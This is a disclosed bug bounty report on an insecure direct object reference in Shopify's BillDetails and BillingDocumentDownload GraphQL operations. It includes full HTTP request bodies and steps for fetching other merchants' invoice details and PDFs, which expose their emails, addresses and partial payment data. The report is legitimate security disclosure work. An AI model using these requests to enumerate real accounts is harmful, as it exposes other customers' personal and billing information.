# IDOR on GraphQL queries BillingDocumentDownload and BillDetails

## Report Details
- **Report ID**: 2207248
- **URL**: https://hackerone.com/reports/2207248
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-10-12T23:14:29.838Z
- **Disclosed**: 2024-02-08T15:01:53.719Z

## Reporter
- **Username**: blaklis
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
## Summary:
An IDOR on the `BillingInvoice` id on both `BillingDocumentDownload` and `BillDetails` graphql operations are leaking other merchants' ██████: 

- email
- full address
- content of their invoice
- last 4 digits of credit card + type of credit card OR paypal email
- shop impacted

## Shops Used to Test:
Tested ID ██████ before I saw it was indeed embedding others' customers data.

## Relevant Request IDs:
f858a40e-ad0d-407a-a589-3ffb40cc5ae5

## Steps To Reproduce:

1. Whatever the user you're loggedin with, run the following request : 

```
POST /api/shopify/███?operation=BillDetails&type=query HTTP/2
Host: admin.shopify.com
Cookie: ██████████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
X-Shopify-Web-Force-Proxy: 1
X-Csrf-Token: ████████
Caller-Pathname: /store/████████/access_account/invoice/███
Content-Length: 6674
Origin: https://admin.shopify.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Pwnfox-Color: cyan
Te: trailers

{"operationName":"BillDetails","variables":{"id":"████","hasBillingSubscriptionsPermission":false},"query":"query BillDetails($id: ID!, $hasBillingSubscriptionsPermission: Boolean!) {\n  shop {\n    id\n    myshopifyDomain\n    countryCode\n    createdAt\n    name\n    plan {\n      name\n      __typename\n    }\n    easeMerchantFailedBillManualPaymentAttempts: experimentAssignment(\n      name: \"ease_merchant_failed_bill_manual_payment_attempts\"\n    )\n    __typename\n  }\n  billingAccount {\n    id\n    subscription @include(if: $hasBillingSubscriptionsPermission) {\n      id\n      billingPeriod\n      __typename\n    }\n    activePaymentMethod {\n      __typename\n      ... on BillingBankAccount {\n        id\n        bankName\n        lastDigits\n        compatibleCurrencies\n        __typename\n      }\n      ... on BillingCreditCard {\n        id\n        brand\n        lastDigits\n        compatibleCurrencies\n        __typename\n      }\n      ... on BillingReseller {\n        id\n        compatibleCurrencies\n        __typename\n      }\n      ... on BillingPaypalAccount {\n        id\n        email\n        compatibleCurrencies\n        __typename\n      }\n      ... on BillingBalance {\n        id\n        compatibleCurrencies\n        __typename\n      }\n      ... on BillingShopifyBalanceCard {\n        id\n        compatibleCurrencies\n        __typename\n      }\n      ... on BillingManualPayment {\n        id\n        compatibleCurrencies\n        __typename\n      }\n      ... on BillingUpiAccount {\n        id\n        upiId\n        compatibleCurrencies\n        __typename\n      }\n    }\n    ...BillingPaymentMethods\n    validPaymentMethods\n    currency\n    __typename\n  }\n  node(id: $id) {\n    id\n    ... on BillingInvoice {\n      id\n      credits {\n        name\n        category\n        invoiceAmount {\n          amount\n          currencyCode\n          __typename\n        }\n        __typename\n      }\n      chargeCategories {\n        shopId\n        shopName\n        shopDomain\n        category\n        name\n        description\n        count\n        subtotalAmount {\n          amount\n          currencyCode\n          __typename\n        }\n        charges {\n          __typename\n          discountValue {\n            __typename\n            ... on AppSubscriptionDiscountPercentage {\n              percentage\n              __typename\n            }\n            ... on AppSubscriptionDiscountAmount {\n              amount {\n                amount\n                currencyCode\n                __typename\n              }\n              __typename\n            }\n          }\n          amount {\n            amount\n            currencyCode\n            __typename\n          }\n          originalAmount {\n            amount\n            currencyCode\n            __typename\n          }\n          exchangeRate\n          exchangeRateAt\n          issuedAt\n          description\n          title\n          apiClientId\n          feeType\n          hasTraceabilityBetaFlag\n          chargesUrl: url\n        }\n        __typename\n      }\n      createdAt\n      billOn\n      dueOn\n      netTerm\n      status\n      name\n      originClassification\n      prefixBillName\n      purchaseType\n      authenticationStatus\n      strongCustomerAuthenticationPayload {\n        clientToken\n        paymentMethodNonce\n        redirectUrl\n        type\n        __typename\n      }\n      lastFailureReason\n      lastFailureMessage\n      totalAmount {\n        amount\n        currencyCode\n        __typename\n      }\n      totalCreditAmount {\n        amount\n        currencyCode\n        __typename\n      }\n      subtotalAmount {\n        amount\n        currencyCode\n        __typename\n      }\n      refundedAmount {\n        amount\n        currencyCode\n        __typename\n      }\n      timeline {\n        status\n        date\n        amount {\n          amount\n          currencyCode\n          __typename\n        }\n        __typename\n      }\n      paymentMethod {\n        __typename\n        ... on BillingBankAccount {\n          id\n          bankName\n          lastDigits\n          synchronous\n          __typename\n        }\n        ... on BillingCreditCard {\n          id\n          brand\n          lastDigits\n          synchronous\n          __typename\n        }\n        ... on BillingReseller {\n          id\n          synchronous\n          __typename\n        }\n        ... on BillingPaypalAccount {\n          id\n          email\n          synchronous\n          __typename\n        }\n        ... on BillingBalance {\n          id\n          synchronous\n          __typename\n        }\n        ... on BillingManualPayment {\n          id\n          synchronous\n          __typename\n        }\n        ... on BillingUpiAccount {\n          id\n          upiId\n          synchronous\n          __typename\n        }\n        ... on BillingShopifyBalanceCard {\n          id\n          synchronous\n          __typename\n        }\n      }\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment BillingPaymentMethods on BillingAccount {\n  id\n  paymentMethods {\n    __typename\n    ... on BillingBankAccount {\n      id\n      priority\n      bankName\n      lastDigits\n      verificationStatus\n      synchronous\n      compatibleCurrencies\n      __typename\n    }\n    ... on BillingCreditCard {\n      id\n      priority\n      brand\n      lastDigits\n      expired\n      expiryMonth\n      expiryYear\n      synchronous\n      compatibleCurrencies\n      __typename\n    }\n    ... on BillingShopifyBalanceCard {\n      id\n      priority\n      synchronous\n      compatibleCurrencies\n      __typename\n    }\n    ... on BillingReseller {\n      id\n      priority\n      uid\n      handle\n      synchronous\n      compatibleCurrencies\n      __typename\n    }\n    ... on BillingPaypalAccount {\n      id\n      priority\n      email\n      synchronous\n      compatibleCurrencies\n      __typename\n    }\n    ... on BillingBalance {\n      id\n      priority\n      synchronous\n      compatibleCurrencies\n      __typename\n    }\n    ... on BillingShopifyBalanceAccount {\n      id\n      priority\n      synchronous\n      compatibleCurrencies\n      __typename\n    }\n    ... on BillingUpiAccount {\n      id\n      priority\n      upiId\n      synchronous\n      compatibleCurrencies\n      __typename\n    }\n    ... on BillingManualPayment {\n      id\n      priority\n      synchronous\n      compatibleCurrencies\n      __typename\n    }\n  }\n  __typename\n}\n"}
```

That will give you some infos about the invoice.

You can also download the PDF of the invoice, with different infos embedded in it : 

```
POST /api/shopify/██████?operation=BillingDocumentDownload&type=mutation HTTP/2
Host: admin.shopify.com
Cookie: ██████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
X-Shopify-Web-Force-Proxy: 1
X-Csrf-Token: ████
Caller-Pathname: /store/█████████/access_account/invoice/██████
Content-Length: 433
Origin: https://admin.shopify.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Pwnfox-Color: cyan
Te: trailers

{"operationName":"BillingDocumentDownload","variables":{"id":"████","documentType":"CREDIT_NOTE"},"query":"mutation BillingDocumentDownload($id: ID!, $documentType: BillingDocumentType) {\n  billingDocumentDownload(id: $id, documentType: $documentType) {\n    job {\n      id\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

Replace in the request the cookies, the shop name and the CSRF token, then access https://admin.shopify.com/store/*yourshop*/invoices/*theid*/download.html?document_type=INVOICE

Funnily enough, the PDF invoice display my own firstname / lastname, but will display the other merchants' email and full address.

## Impact

## Summary:

An attacker is able to dump ███ merchants through their invoices.

## Attachments
No attachments
